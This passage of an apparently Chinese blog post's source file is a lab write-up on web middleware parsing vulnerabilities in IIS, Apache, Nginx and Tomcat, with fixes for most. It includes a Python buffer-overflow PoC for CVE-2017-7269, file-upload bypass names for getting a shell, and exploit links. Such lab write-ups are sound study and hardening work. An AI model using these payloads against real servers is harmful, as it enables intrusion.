data = sock.recv(80960)  \n    except :\n        pass\n    \n    print data\n    \n    sock.close()\n    \n    if not -1==data.find('HHIT CVE-2017-7269 Success') :\n        return True\n    \n    return False\n    \n    \nif 2==len(sys.argv) :\n    print send_pack(sys.argv[1])\nelse :\n    print send_pack(sys.argv[1],int(sys.argv[2]))\n\n```\n\n![005_1](/img/knowledge/Middleware_Parsing_vulnerability/005_1.png)\n\n### 利用\n\n`https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2`\n\n将上面的`cve-2017-7269.rb`拷贝到kali的`/usr/share/metasploit-framework/modules/exploits/windows/iis`下\n\n![005_2](/img/knowledge/Middleware_Parsing_vulnerability/005_2.png)\n\n### 修复方式\n\n1. 由于微软已不再对Windows Server 2003提供支持，建议禁用webDAV功能。\n2. 升级到最新系统 Windows Server 2016。\n\n# Apache相关\n\n## Apache HTTPD 换行解析漏洞（CVE-2017-15715）\n\n环境采用vulhub的`/httpd/CVE-2017-15715`\n\n### 漏洞原理\n\nApache版本在2.4.0到2.4.29\n\n正则中的`$`不仅可以匹配行尾,如果设置了 RegExp 对象的 Multiline 属性，则 `$`也匹配 '\\n' 或 '\\r'。\n\n```\n<FilesMatch \\.php$>\n        SetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n因此16进制的换行符能被`$`匹配从而被PHP解析。\n\n### 实践过程\n\n可以利用到文件上传中来绕过黑名单,在Apache版本(2.4.0到2.4.29)中上传的`info.php%0A`文件又能被解析,即可getshell。\n\n这个docker环境没有前端代码的,加一个\n\n```\n#upload.html\n<html>\n    <head>\n        <title>CVE-2017-15715</title>\n    </head>\n    <body>\n        <form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\">\n            <input type=\"file\" name='file'>\n            <input type=\"submit\" value=\"upload\">\n\t    <input type=\"text\" name=\"name\">\n        </form>\n    </body>\n</html>\n```\n\n```\n#index.php\n<?php\nif(isset($_FILES['file'])) {\n    $name = basename($_POST['name']);\n    $ext = pathinfo($name,PATHINFO_EXTENSION);\n    if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {\n        exit('bad file');\n    }\n    move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);\n}\n```\n\n直接上传php文件会被exit,现在将上传的文件名修改成`info.php%0a`\n\n![003_1](/img/knowledge/Middleware_Parsing_vulnerability/003_1.png)\n\n已经上传成功\n\n![003_2](/img/knowledge/Middleware_Parsing_vulnerability/003_2.png)\n\n![003_3](/img/knowledge/Middleware_Parsing_vulnerability/003_3.png)\n\n确实是存在解析漏洞的。\n\nwindows操作系统不允许后缀以换行符结尾的文件命名方式，创建文件会失败，所以还是比较鸡肋的。\n\n### 修复方式\n\n获取文件名时用`$_FILES['file']['name']`,它会将换行符号自动去除。\n\n```\n<?php\nif(isset($_FILES['file'])) {\n    #$name = basename($_POST['name']);\n    $name = $_FILES['file']['name'];\n    $ext = pathinfo($name,PATHINFO_EXTENSION);\n    if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {\n        exit('bad file');\n    }\n    move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);\n}\n```\n\n![003_4](/img/knowledge/Middleware_Parsing_vulnerability/003_4.png)\n\n可以看到上传失败了。\n\n1.  上传文件功能配合白名单为过滤条件 \n2.  上传文件目录限制脚本执行权限\n\n## Apache HTTPD 未知后缀解析漏洞\n\n环境采用vulhub的`/httpd/apache_parsing_vulnerability`\n\n### 漏洞原理\n\nApache默认一个文件可以有多个点分隔的后缀,如果最右的后缀无法解析会向左推进。加上运维人员错误配置如下\n\n```\nAddHandler application/x-httpd-php .php\n```\n\n可以发现上面的配置没有正则匹配的，所以在任意位置匹配到`.php`，会拿去给`php_module`解析。\n\n### 实践过程\n\n![004_1](/img/knowledge/Middleware_Parsing_vulnerability/004_1.png)\n\n![004_2](/img/knowledge/Middleware_Parsing_vulnerability/004_2.png)\n\n![004_3](/img/knowledge/Middleware_Parsing_vulnerability/004_3.png)\n\n### 修复方式\n\n修改AddHandler方法为SetHandler方法\n\n```\n#AddHandler application/x-httpd-php .php\n<FilesMatch \".+\\.php$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n![004_4](/img/knowledge/Middleware_Parsing_vulnerability/004_4.png)\n\n禁止`.php.`格式执行\n\n```\n<FilesMatch \".+\\. ph(p[3457]?|t|tml)\\.\">\nRequire all denied\n</FilesMatch>\n```\n# Nginx相关\n\n## Nginx <8.03畸形解析漏洞\n\n### 漏洞原理\n\n测试环境采用的是`vulhub`的`nginx/nginx_parsing_vulnerability`,说是Nginx的锅,实际还是和上面的一样,还是`cgi.fix_pathinfo=1`,当访问`ngnix.png/.php`时,`ngnix.png/.php`存在而进行修剪,最终将`ngnix.png`当php解析。\n\n![002_7](/img/knowledge/Middleware_Parsing_vulnerability/002_7.png)\n\n#### Nginx修复方式\n\n1. 修改php.ini文件，将cgi.fix_pathinfo的值设置为0\n\n2. 正则表达式过滤非法输入,代码如下\n\n   ```\n   #配置nginx.conf\n   if ( $fastcgi_script_name ~ \\..*\\/.*php ) {\n   　　return 403;\n   }\n   ```\n\n3. 在Nginx端使用`fastcgi_split_path_info`将path info信息去除后，用tryfiles判断文件是否存在；并设置PHP-FPM的`security.limit_extensions`为`.php`，避免其他后缀文件被解析。\n\n## Nginx 配置错误导致漏洞\n\n### 目录穿越漏洞\n\n#### 漏洞原因\n\n错误的配置导致目录遍历和信息泄露\n\n`autoindex on`开启了目录遍历。Nginx在配置别名（Alias）的时候，如果忘记加`/`，将造成一个目录穿越漏洞。\n\n错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：\n\n\n\n![006_2](/img/knowledge/Middleware_Parsing_vulnerability/006_2.png)\n\n\n\n![006_1](/img/knowledge/Middleware_Parsing_vulnerability/006_1.png)\n\n#### 修复方式\n\n将`autoindex on;`改成`autoindex off`。\n\n`/files`补全为`/files/`\n\n![006_3](/img/knowledge/Middleware_Parsing_vulnerability/006_3.png)\n\n### CRLF注入漏洞\n\nCRLF是”回车 + 换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。\n\nNginx会将`$uri`进行解码，导致传入%0a%0d即可引入换行符，而造成CRLF注入漏洞。\n\n查看Nginx文档，可以发现有三个表示uri的变量：\n\n1. `$uri`\n2. `$document_uri`\n3. `$request_uri`\n\n1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。\n\n错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：\n\n```\nserver {\n\tlisten 8080;\n\n\troot /usr/share/nginx/html;\n\n\tindex index.html;\n\n\tserver_name _;\n\n\tlocation / {\n        return 302 https://$host$uri;\n    }\n```\n\n#### 利用方式\n\n##### 会话固定\n\n![006_4](/img/knowledge/Middleware_Parsing_vulnerability/006_4.png)\n\n##### xss漏洞\n\n##### 设置Cookie引发的CSRF漏洞\n\n#### 修复方式\n\n```\nlocation / {\n    return 302 https://$host$request_uri;\n}\n```\n\n# Tomcat相关 \n\n## PUT方法任意写文件漏洞 (CVE-2017-12615)\n\n### 漏洞条件\n\n在Tomcat安装目录下的配置文件web.xml中的org.apache.catalina.servlets.DefaultServlet方法下如果该方法有如下代码，即表示Tomcat已开启PUT方法\n\n```\n<init-param> \n      <param-name>readonly</param-name> \n      <param-value>false</param-value> \n</init-param>\n```\n\n![007_1](/img/knowledge/Middleware_Parsing_vulnerability/007_1.png)\n\n![007_2](/img/knowledge/Middleware_Parsing_vulnerability/007_2.png)\n\n### 利用exp\n\n`https://github.com/iBearcat/CVE-2017-12615`\n\n![007_3](/img/knowledge/Middleware_Parsing_vulnerability/007_3.png)\n\n![007_4](/img/knowledge/Middleware_Parsing_vulnerability/007_4.png)\n\n### 修复方式\n\n在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数\n\n```\n<init-param>\n      <param-name>readonly</param-name>\n      <param-value>true</param-value>\n</init-param>\n```\n\n确保readonly参数为true（默认值），即不允许DELETE和PUT操作。","source":"_posts/中间件解析漏洞整理.md","raw":"---\n\ntitle: 中间件及其相关漏洞复现\ndate: 2018-11-23 14:17:11\ntags: [知识点]\ncategories: 整理\n---\n\n# 中间件及其相关漏洞复现\n\n# IIS相关\n\n## IIS 5.x-6.x 解析漏洞\n\n一个细的知识点:IIS6.0 默认的可执行文件除了asp还包含这三种(aspx也能)\n\n```\n/yyg.asa\n/yyg.cer\n/yyg.cdx #本地测试失败,变成下载\n/yyg.aspx\n```\n\n### 漏洞原理\n\n未修改配置的情况下,IIS`asa`,`asp`,`cdx`,`cer`这几个缀名映射的了负责解析的asp.dll。\n\n![001_0](/img/knowledge/Middleware_Parsing_vulnerability/001_0.png)\n\niis 6.0解析漏洞有两种利用方式\n\n### 目录解析\n\n```\n/yyg.asp/yyg.png\n```\n目录解析方式利用如上,在网站上建立了`.asp`或`.asa`等可利用的文件夹,在该文件夹下的任何扩张名的文件都会被IIS解析成asp文件来执行。\n\n一般的利用方式:\n\n创建目录`yyg.asp`,那么通过某种手段上传文件到该目录\n\n```\n/yyg.asp/yyg.png\n```\n\n无视后缀名即可拿shell\n\n![001_1](/img/knowledge/Middleware_Parsing_vulnerability/001_1.png)\n\n### 文件解析\n\n```\n/yyg.asp;.png\n```\n\n![001_2](/img/knowledge/Middleware_Parsing_vulnerability/001_2.png)\n\n`/yyg.asp;.png`分号后面的`.png`不会被解析\n\n### 修复方式\n\n由于微软认为这是IIS的特性,一直没有安全补丁,可以选择高版本的IIS.\n\n1. 通过正则编写,阻止非法文件名上传\n2. 进行权限设置,限制用户创建文件夹\n\n## IIS 7.0/IIS 7.5/Nginx <8.03畸形解析漏洞解析漏洞\n\n### 漏洞原理\n\n漏洞需要Fast-CGI调用php,并且在php.ini中需要cgi.fix_pathinfo=1。在这个选项被打开的情况下,php-fpm会`SCRIPT_FILENAME`是否存在，如果不存在则去掉最后一个`/`及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。所以，第一次fpm发现`yyg.png/.php`不存在，则去掉`/.php`，再判断`yyg.png`是否存在。当这个文件是存在的，会被作为PHP文件执行，导致解析漏洞。\n\n### IIS 7.5\n\n测试环境:win7(x86)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)\n\nwin2008R2(x64)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)\n\n需要php.ini中cgi.fix_pathinfo=1,通常情况下是默认开启。\n\n![002_1](/img/knowledge/Middleware_Parsing_vulnerability/002_1.png)\n\n\n\n![002_2](/img/knowledge/Middleware_Parsing_vulnerability/002_2.png)\n\n![002_3](/img/knowledge/Middleware_Parsing_vulnerability/002_3.png)\n\n### IIS 7.0\n\n![002_4](/img/knowledge/Middleware_Parsing_vulnerability/002_4.png)\n\n\n\n### IIS 7.0/7.5 修复方式\n\n1.如果需要继续FastCGI方式调用PHP,可以在php.ini中设置cgi.fix_pathinfo=0,修改保存后要重启IIS,可能影响到某些服务,谨慎使用。\n\n2.增强IIS设置\n\n在IIS里找到“处理程序映射”，然后对PHP这一项进行编辑，点击“请求限制”，把“仅当请求映射至以下内容时才调用处理程序”这个选项勾上即可；\n\n![002_5](/img/knowledge/Middleware_Parsing_vulnerability/002_5.png)\n\n查看解析结果\n\n![002_6](/img/knowledge/Middleware_Parsing_vulnerability/002_6.png)\n\n### Nginx\n\n### 漏洞原理\n\n测试环境采用的是`vulhub`的`nginx/nginx_parsing_vulnerability`,说是Nginx的锅,实际还是和上面的一样,还是`cgi.fix_pathinfo=1`,当访问`ngnix.png/.php`时,`ngnix.png/.php`存在而进行修剪,最终将`ngnix.png`当php解析。\n\n![002_7](/img/knowledge/Middleware_Parsing_vulnerability/002_7.png)\n\n#### Nginx修复方式\n\n1. 修改php.ini文件，将cgi.fix_pathinfo的值设置为0\n\n2. 正则表达式过滤非法输入,代码如下\n\n   ```\n   #配置nginx.conf\n   if ( $fastcgi_script_name ~ \\..*\\/.*php ) {\n   　　return 403;\n   }\n   ```\n\n3. 在Nginx端使用`fastcgi_split_path_info`将path info信息去除后，用tryfiles判断文件是否存在；并借助PHP-FPM的`security.limit_extensions`配置项，避免其他后缀文件被解析。\n\n## IIS6.0远程命令执行漏洞(CVE-2017-7269)\n\n### 漏洞原理\n\n开启WebDAV服务的IIS 6.0存在缓存区溢出漏洞导致远程代码执行\n\n### 环境\n\nwindows server2003\n\n### 探测脚本\n\n`https://github.com/lcatro/CVE-2017-7269-Echo-PoC`\n\n```\n#https://github.com/lcatro/CVE-2017-7269-Echo-PoC\nimport socket\nimport sys\nimport time\n\ndef generate_payload(port):\n    pay='PROPFIND / HTTP/1.1\\r\\nHost: localhost:'+ port  +'\\r\\nContent-Length: 0\\r\\n'\n    pay+='If: <http://localhost:' + port + '/aaaaaaa'\n    pay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'\n    pay+='>'\n    pay+=' (Not <locktoken:write1>) <http://localhost:' + port + '/bbbbbbb'\n    pay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'\n    shellcoden    pay+=shellcode\n    pay+='>\\r\\n\\r\\n'\n    return pay\n\ndef send_pack(ip,port=80) :\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip,port))\n    time_tick=time.time()\n    sock.send(generate_payload(str(port)))\n    \n    try :\n        data = sock.recv(80960)  \n    except :\n        pass\n    \n    print data\n    \n    sock.close()\n    \n    if not -1==data.find('HHIT CVE-2017-7269 Success') :\n        return True\n    \n    return False\n    \n    \nif 2==len(sys.argv) :\n    print send_pack(sys.argv[1])\nelse :\n    print send_pack(sys.argv[1],int(sys.argv[2]))\n\n```\n\n![005_1](/img/knowledge/Middleware_Parsing_vulnerability/005_1.png)\n\n### 利用\n\n`https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2`\n\n将上面的`cve-2017-7269.rb`拷贝到kali的`/usr/share/metasploit-framework/modules/exploits/windows/iis`下\n\n![005_2](/img/knowledge/Middleware_Parsing_vulnerability/005_2.png)\n\n### 修复方式\n\n1. 由于微软已不再对Windows Server 2003提供支持，建议禁用webDAV功能。\n2. 升级到最新系统 Windows Server 2016。\n\n# Apache相关\n\n## Apache HTTPD 换行解析漏洞（CVE-2017-15715）\n\n环境采用vulhub的`/httpd/CVE-2017-15715`\n\n### 漏洞原理\n\nApache版本在2.4.0到2.4.29\n\n正则中的`$`不仅可以匹配行尾,如果设置了 RegExp 对象的 Multiline 属性，则 `$`也匹配 '\\n' 或 '\\r'。\n\n```\n<FilesMatch \\.php$>\n        SetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n因此16进制的换行符能被`$`匹配从而被PHP解析。\n\n### 实践过程\n\n可以利用到文件上传中来绕过黑名单,在Apache版本(2.4.0到2.4.29)中上传的`info.php%0A`文件又能被解析,即可getshell。\n\n这个docker环境没有前端代码的,加一个\n\n```\n#upload.html\n<html>\n    <head>\n        <title>CVE-2017-15715</title>\n    </head>\n    <body>\n        <form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\">\n            <input type=\"file\" name='file'>\n            <input type=\"submit\" value=\"upload\">\n\t    <input type=\"text\" name=\"name\">\n        </form>\n    </body>\n</html>\n```\n\n```\n#index.php\n<?php\nif(isset($_FILES['file'])) {\n    $name = basename($_POST['name']);\n    $ext = pathinfo($name,PATHINFO_EXTENSION);\n    if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {\n        exit('bad file');\n    }\n    move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);\n}\n```\n\n直接上传php文件会被exit,现在将上传的文件名修改成`info.php%0a`\n\n![003_1](/img/knowledge/Middleware_Parsing_vulnerability/003_1.png)\n\n已经上传成功\n\n![003_2](/img/knowledge/Middleware_Parsing_vulnerability/003_2.png)\n\n![003_3](/img/knowledge/Middleware_Parsing_vulnerability/003_3.png)\n\n确实是存在解析漏洞的。\n\nwindows操作系统不允许后缀以换行符结尾的文件命名方式，创建文件会失败，所以还是比较鸡肋的。\n\n### 修复方式\n\n获取文件名时用`$_FILES['file']['name']`,它会将换行符号自动去除。\n\n```\n<?php\nif(isset($_FILES['file'])) {\n    #$name = basename($_POST['name']);\n    $name = $_FILES['file']['name'];\n    $ext = pathinfo($name,PATHINFO_EXTENSION);\n    if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {\n        exit('bad file');\n    }\n    move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);\n}\n```\n\n![003_4](/img/knowledge/Middleware_Parsing_vulnerability/003_4.png)\n\n可以看到上传失败了。\n\n1.  上传文件功能配合白名单为过滤条件 \n2.  上传文件目录限制脚本执行权限\n\n## Apache HTTPD 未知后缀解析漏洞\n\n环境采用vulhub的`/httpd/apache_parsing_vulnerability`\n\n### 漏洞原理\n\nApache默认一个文件可以有多个点分隔的后缀,如果最右的后缀无法解析会向左推进。加上运维人员错误配置如下\n\n```\nAddHandler application/x-httpd-php .php\n```\n\n可以发现上面的配置没有正则匹配的，所以在任意位置匹配到`.php`，会拿去给`php_module`解析。\n\n### 实践过程\n\n![004_1](/img/knowledge/Middleware_Parsing_vulnerability/004_1.png)\n\n![004_2](/img/knowledge/Middleware_Parsing_vulnerability/004_2.png)\n\n![004_3](/img/knowledge/Middleware_Parsing_vulnerability/004_3.png)\n\n### 修复方式\n\n修改AddHandler方法为SetHandler方法\n\n```\n#AddHandler application/x-httpd-php .php\n<FilesMatch \".+\\.php$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n![004_4](/img/knowledge/Middleware_Parsing_vulnerability/004_4.png)\n\n禁止`.php.`格式执行\n\n```\n<FilesMatch \".+\\. ph(p[3457]?|t|tml)\\.\">\nRequire all denied\n</FilesMatch>\n```\n# Nginx相关\n\n## Nginx <8.03畸形解析漏洞\n\n### 漏洞原理\n\n测试环境采用的是`vulhub`的`nginx/nginx_parsing_vulnerability`,说是Nginx的锅,实际还是和上面的一样,还是`cgi.fix_pathinfo=1`,当访问`ngnix.png/.php`时,`ngnix.png/.php`存在而进行修剪,最终将`ngnix.png`当php解析。\n\n![002_7](/img/knowledge/Middleware_Parsing_vulnerability/002_7.png)\n\n#### Nginx修复方式\n\n1. 修改php.ini文件，将cgi.fix_pathinfo的值设置为0\n\n2. 正则表达式过滤非法输入,代码如下\n\n   ```\n   #配置nginx.conf\n   if ( $fastcgi_script_name ~ \\..*\\/.*php ) {\n   　　return 403;\n   }\n   ```\n\n3. 在Nginx端使用`fastcgi_split_path_info`将path info信息去除后，用tryfiles判断文件是否存在；并设置PHP-FPM的`security.limit_extensions`为`.php`，避免其他后缀文件被解析。\n\n## Nginx 配置错误导致漏洞\n\n### 目录穿越漏洞\n\n#### 漏洞原因\n\n错误的配置导致目录遍历和信息泄露\n\n`autoindex on`开启了目录遍历。Nginx在配置别名（Alias）的时候，如果忘记加`/`，将造成一个目录穿越漏洞。\n\n错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：\n\n\n\n![006_2](/img/knowledge/Middleware_Parsing_vulnerability/006_2.png)\n\n\n\n![006_1](/img/knowledge/Middleware_Parsing_vulnerability/006_1.png)\n\n#### 修复方式\n\n将`autoindex on;`改成`autoindex off`。\n\n`/files`补全为`/files/`\n\n![006_3](/img/knowledge/Middleware_Parsing_vulnerability/006_3.png)\n\n### CRLF注入漏洞\n\nCRLF是”回车 + 换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。\n\nNginx会将`$uri`进行解码，导致传入%0a%0d即可引入换行符，而造成CRLF注入漏洞。\n\n查看Nginx文档，可以发现有三个表示uri的变量：\n\n1. `$uri`\n2. `$document_uri`\n3. `$request_uri`\n\n1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。\n\n错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：\n\n```\nserver {\n\tlisten 8080;\n\n\troot /usr/share/nginx/html;\n\n\tindex index.html;\n\n\tserver_name _;\n\n\tlocation / {\n        return 302 https://$host$uri;\n    }\n```\n\n#### 利用方式\n\n##### 